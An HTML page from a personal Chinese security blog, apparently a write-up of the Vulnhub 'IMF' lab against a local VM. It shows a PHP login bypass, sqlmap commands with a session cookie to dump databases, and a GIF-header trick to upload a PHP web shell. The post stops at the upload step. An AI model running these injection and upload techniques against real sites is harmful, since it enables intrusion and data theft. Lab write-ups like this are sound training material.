@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>8IMF | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">8IMF</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:05:02</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>IMF</p>
+<p><img src="/8imf//1.png" alt="1"></p>
+<p>nmap 192.168.0.0&#x2F;24</p>
+<p>扫出来ip192.168.0.134</p>
+<p>nmap、dirsearch进行信息收集然后手动查看80端口</p>
+<p><img src="/8imf//2.png" alt="2"></p>
+<p>在这里查到第一个flag，里面的base64解码之后提示是要合并起来，看到里面的几个js文件名之后明白</p>
+<p><img src="/8imf//3.png" alt="3"></p>
+<p>这里几个base64放一块就发现第二个flag</p>
+<p><img src="/8imf//4.png" alt="4"></p>
+<p><img src="/8imf//5.png" alt="5"></p>
+<p>这里面base64接出来是这个，查看目录是一个登录页面</p>
+<p>nmap和dirsearch结果也出来了，只有80一个端口，也没有可以利用的目录</p>
+<p><img src="/8imf//6.png" alt="6"></p>
+<p>这个登录框有提示：说是硬编码，我想起了&#x3D;&#x3D;和&#x3D;&#x3D;&#x3D;是不一样的，这一点可以一会到后台看代码，直接拿出burpsuite</p>
+<p><img src="/8imf//7.png" alt="7"></p>
+<p>拦下来之后直接用数组绕过，还有其他方法比如用两个相同的md5绕过</p>
+<p><img src="/8imf//8.png" alt="8"></p>
+<p>这里拿到flag3，和一个CMS</p>
+<p>发现URL里面pagename参数存在注入点，由于现在是登录状态，所以需要找到cookie一起用sqlmap</p>
+<p><img src="/8imf//9.png" alt="9"></p>
+<p>sqlmap.py -u ‘<a target="_blank" rel="noopener" href="http://192.168.0.134/imfadministrator/cms.php?pagename=upload%E2%80%99">http://192.168.0.134/imfadministrator/cms.php?pagename=upload’</a> –cookie ‘PHPSESSID&#x3D;eq9ctukn7srbig5ac9hahmdot2’ –dbs</p>
+<p><img src="/8imf//10.png" alt="10"></p>
+<p>查到数据库，通过information_schema查表</p>
+<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://192.168.0.134/imfadministrator/cms.php?pagename=upload%E2%80%99">http://192.168.0.134/imfadministrator/cms.php?pagename=upload’</a> –cookie ‘PHPSESSID&#x3D;eq9ctukn7srbig5achahmdot2’ –dbs</p>
+<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://192.168.0.134/imfadministrator/cms.php?pagename=upload%E2%80%99">http://192.168.0.134/imfadministrator/cms.php?pagename=upload’</a> –cookie ‘PHPSESSID&#x3D;eq9ctukn7srbig5ac9hahmdot2’ -D information_schema –tables –batch</p>
+<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://192.168.0.134/imfadministrator/cms.php?pagename=upload%E2%80%99">http://192.168.0.134/imfadministrator/cms.php?pagename=upload’</a> –cookie ‘PHPSESSID&#x3D;eq9ctukn7srbig5ac9hahmdot2’ -D information_schema -T USER_PRIVILEGES –columns –batch</p>
+<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://192.168.0.134/imfadministrator/cms.php?pagename=upload%E2%80%99">http://192.168.0.134/imfadministrator/cms.php?pagename=upload’</a> –cookie ‘PHPSESSID&#x3D;eq9ctukn7srbig5achahmdot2’ -D admin –dump –dump-format&#x3D;CSV –output-dir&#x3D;. –level&#x3D;5 –risk&#x3D;3 –random-agent –tamper&#x3D;space2comment –batch</p>
+<p>发现<a target="_blank" rel="noopener" href="http://192.168.56.148/imfadministrator/images/whiteboard.jpg">&#x2F;imfadministrator&#x2F;images&#x2F;whiteboard.jpg</a>二维码一扫就能拿到flag4</p>
+<p>解码，uploadr942.php 文件上传</p>
+<p>经过尝试允许上传jpg、png、gif但是存在waf，利用双扩展名或空字符都无法绕过waf。用文件头来欺骗好了</p>
+<p>echo ‘GIF89a &lt;?php echo ‘id’; ?&gt;‘ &gt; shell.gif</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>G00d</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/8imf/">http://example.com/8imf/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2024 G00d. All rights reserved.</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../9tr0ll2/">9Tr0ll2</a>
+            
+            
+            <a class="next" rel="next" href="../7derpnstink/">7DeRPnStiNK</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
